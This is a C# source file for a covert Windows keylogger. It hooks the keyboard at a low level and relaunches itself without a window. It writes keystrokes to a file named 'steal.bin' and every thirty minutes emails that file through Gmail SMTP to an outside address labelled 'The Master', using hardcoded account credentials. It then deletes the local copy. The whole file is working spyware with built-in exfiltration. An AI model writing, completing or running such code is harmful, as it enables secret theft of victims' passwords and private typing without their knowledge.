using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Net;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static List<int> keys = new List<int>();

    public static void Main(string[] args)
    {
        if(args.Length > 0)
        {
            _hookID = SetHook(_proc);
            Processing();
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
        else
        {
            try
            {
                using(Process myProcess = new Process())
                {
                    myProcess.StartInfo.UseShellExecute = false;
                    myProcess.StartInfo.CreateNoWindow = true;
                    myProcess.StartInfo.FileName = Environment.ProcessPath;
                    myProcess.StartInfo.Arguments = "/a";
                    myProcess.Start();
                    myProcess.Close();
                }
            }
            catch(Exception e)
            {
                _hookID = SetHook(_proc);
                Processing();
                Application.Run();
                UnhookWindowsHookEx(_hookID);
            }
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    private static void Transmit ()
    {
        using (SmtpClient client = new SmtpClient())
        {
            client.Host = "smtp.gmail.com";
            client.Port = 587;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new NetworkCredential("puckishplatypus@gmail.com", "ikcj ifjv jmui smqd");
            using (MailMessage message = new MailMessage(
                from: new MailAddress("puckishplatypus@gmail.com", "The Ominious Sender..."),
                to: new MailAddress("cofm98@outlook.com", "The Master")
            ))
            {
                message.Subject = "New Report";
                message.Body = "Hello Sir,\n\n Please see the attached file regarding our findings for the past 30 minutes.\n\nKind Regards,\nOminious Sender, The.";
                message.Attachments.Add(new Attachment("steal.bin"));
                client.Send(message);
            }
        }
        File.Delete("steal.bin");
        Processing();
    }
    private static async void Processing()
    {
        await Task.Delay(30 * 60 * 1000);
        if(!SaveOut())
            Transmit();
    }
    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            ReportKey((Keys)vkCode, vkCode);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
    private static void ReportKey (Keys key, int keyCode)
    {
        keys.Add(keyCode);
        if(keys.Count > 511) // 512B * 4 per int -> 14MB
        {
            SaveOut();
        }
    }
    private static bool SaveOut ()
    {
        int len = 0;
        try
        {
            FileStream file = File.Open("steal.bin", FileMode.Append, FileAccess.Write);
            using (BinaryWriter writer = new BinaryWriter(file))
            {
                foreach(int eakey in keys)
                {
                    writer.Write((short)eakey);
                }
                writer.Close();
            }
            using(file = File.Open("steal.bin", FileMode.Open, FileAccess.Read))
            {
                len = (int)file.Length;
            }

        }
        catch(Exception e)
        {
            FileStream file = File.Open("steal.bin", FileMode.OpenOrCreate, FileAccess.Write);
            using (BinaryWriter writer = new BinaryWriter(file))
            {
                writer.Write("!! Error !!\n" + e.Message);
                writer.Close();
            }
            Transmit();
        }
        keys = new List<int>();
        if(len > 20480) {
            Transmit();
            return true;
        }
        return false;
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}